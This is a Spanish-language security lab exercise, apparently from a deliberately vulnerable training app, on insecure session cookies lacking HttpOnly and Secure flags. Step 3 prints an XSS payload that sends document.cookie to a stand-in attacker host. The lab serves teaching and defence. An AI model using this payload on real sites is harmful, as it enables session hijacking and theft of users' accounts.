# Laboratorio 06: Gestión de Sesiones Insegura

## 🎯 Objetivo
Analizar la configuración de las cookies de sesión y comprender cómo la falta de atributos de seguridad (`HttpOnly`, `Secure`) expone la sesión al robo.

## 📋 Prerrequisitos
1.  Sesión activa.
2.  Modo Vulnerable activo.
3.  Herramientas de Desarrollador del navegador (F12).

## 📝 Instrucciones Paso a Paso

### Paso 1: Inspección de Cookies
1.  Abre las herramientas de desarrollador (F12).
2.  Ve a la pestaña **Aplicación** (Chrome/Edge) o **Almacenamiento** (Firefox).
3.  Despliega la sección **Cookies** y selecciona `localhost`.
4.  Observa las columnas `HttpOnly`, `Secure` y `SameSite` para la cookie `user_id` o `session`.
    *   En modo vulnerable, deberían estar vacías o marcadas como inseguras.

### Paso 2: Acceso vía JavaScript
1.  Ve a la pestaña **Consola**.
2.  Escribe el comando:
    ```javascript
    document.cookie
    ```
3.  Si puedes ver el contenido de la cookie (ej. `user_id=1`), significa que es vulnerable a robo mediante XSS.

### Paso 3: Simulación de Robo
1.  Imagina que has encontrado un XSS (Lab 03 o 04).
2.  El payload para robar esta cookie sería:
    ```html
    <script>new Image().src='http://atacante.com/?cookie='+document.cookie;</script>
    ```

## 🏁 Verificación
*   Confirmar que `document.cookie` devuelve valores sensibles en la consola.

## 🛡️ Preguntas de Reflexión
1.  ¿Qué impide el flag `HttpOnly`?
2.  ¿Por qué es importante el flag `Secure` aunque la red interna sea "segura"?
